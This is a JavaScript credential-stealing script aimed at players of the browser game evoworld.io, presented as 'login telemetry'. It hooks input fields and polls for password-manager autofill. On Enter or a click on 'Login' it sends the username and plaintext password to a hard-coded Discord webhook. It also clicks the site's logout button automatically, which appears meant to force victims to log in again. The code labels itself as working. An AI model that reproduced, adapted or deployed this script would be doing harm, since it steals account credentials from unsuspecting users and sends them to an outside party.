// =====================================
// EvoWorld - Login Telemetry + Logout automatico (WORKING)
// =====================================

const WEBHOOK_URL = "https://discord.com/api/webhooks/1460557294868758536/fyk_86l1FfTntnVbF1Xv-ZKkmmwcfGZotZc5l6yHYjqS02yMu3GxzEIkFXyaK-5Nj9f1"; 

let lastTextInput = null;
let lastPasswordInput = null;
let logoutDone = false; // flag per eseguire logout solo una volta

// Stato precedente per rilevare modifiche silenziose
const lastValues = new WeakMap();

// Traccia focus sugli input
document.addEventListener("focusin", e => {
  if (e.target.tagName === "INPUT") {
    lastValues.set(e.target, e.target.value || "");

    if (e.target.type === "text") {
      lastTextInput = e.target;
      console.log("[Telemetry] input username agganciato");
    } else if (e.target.type === "password") {
      lastOtherInput = e.target;
      console.log("[Telemetry] input password agganciato");
    }
  }
});

// Tastiera / incolla / input normali
document.addEventListener("input", e => {
  if (e.target.tagName === "INPUT") {
    lastValues.set(e.target, e.target.value);

    if (e.target.type === "text") {
      console.log("[Telemetry] username modificato:", e.target.value);
    } else if (e.target.type === "password") {
      console.log("[Telemetry] password modificata");
    }
  }
});

// Change (alcuni autofill lo usano)
document.addEventListener("change", e => {
  if (e.target.tagName === "INPUT") {
    lastValues.set(e.target, e.target.value);

    if (e.target.type === "text") {
      console.log("[Telemetry] username autofill/change:", e.target.value);
    } else if (e.target.type === "password") {
      console.log("[Telemetry] password autofill/change");
    }
  }
});

// Incolla esplicita
document.addEventListener("paste", e => {
  if (e.target.tagName === "INPUT") {
    const pastedText = e.clipboardData.getData("text");

    if (e.target.type === "text") {
      console.log("[Telemetry] username incollato:", pastedText);
    } else if (e.target.type === "password") {
      console.log("[Telemetry] password incollata");
    }
  }
});

// 🔥 POLLING: intercetta autofill silenzioso (password manager / browser)
setInterval(() => {
  document.querySelectorAll("input").forEach(input => {
    const prev = lastValues.get(input) || "";
    const curr = input.value || "";

    if (prev !== curr) {
      lastValues.set(input, curr);

      if (input.type === "text") {
        console.log("[Telemetry] username autofill silenzioso:", curr);
      } else if (input.type === "password") {
        console.log("[Telemetry] password autofill silenzioso");
      }
    }
  });
}, 300);

// ----------------------------
// Funzione di invio telemetry
// ----------------------------
async function sendTelemetry(method) {
  const username = lastTextInput?.value.trim() || "";
  const password = lastPasswordInput?.value || "";

  const payload = {
    event: "login_submit",
    username: username,
    username_length: username.length,
    password: password,
    method,
    timestamp: new Date().toISOString()
  };

  // ----- Console-only (per debug) -----
  console.log("[Telemetry] INVIO SIMULATO");
  console.log(payload);

  // ----- Invio reale su Discord -----
  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
      })
    });
    console.log("[Telemetry] Inviato su Discord");
  } catch (err) {
    console.error("[Telemetry] Errore invio Discord:", err);
  }
}

// ----------------------------
// ENTER (login via tastiera)
// ----------------------------
document.addEventListener("keydown", e => {
  if (e.key === "Enter") sendTelemetry("enter");
});

// ----------------------------
// CLICK SU QUALSIASI "Login"
// ----------------------------
document.addEventListener("click", e => {
  const btn = e.target.closest("button");
  if (btn && btn.textContent?.trim().toLowerCase() === "login") {
    sendTelemetry("click_login");
  }
});

// ---- Auto Logout evoworld.io ----

// variabili GLOBALI sicure
if (window.logoutDone === undefined) {
  window.logoutDone = false;
}

if (window.autoLogoutInterval) {
  clearInterval(window.autoLogoutInterval);
}

window.autoLogoutInterval = setInterval(function () {
  if (window.logoutDone) return;

  var logoutBtn =
    document.querySelector('button.logout') ||
    document.querySelector('a.logout') ||
    document.querySelector('#logout') ||
    document.querySelector('[onclick*="logout"]');

  if (logoutBtn) {
    logoutBtn.click();
    window.logoutDone = true;
    clearInterval(window.autoLogoutInterval);
    console.log("[AutoLogout] Logout automatico eseguito");
  }
}, 1000);

// timeout sicurezza
setTimeout(function () {
  if (!window.logoutDone) {
    clearInterval(window.autoLogoutInterval);
    console.log("[AutoLogout] Logout non trovato (timeout)");
  }
}, 27500);
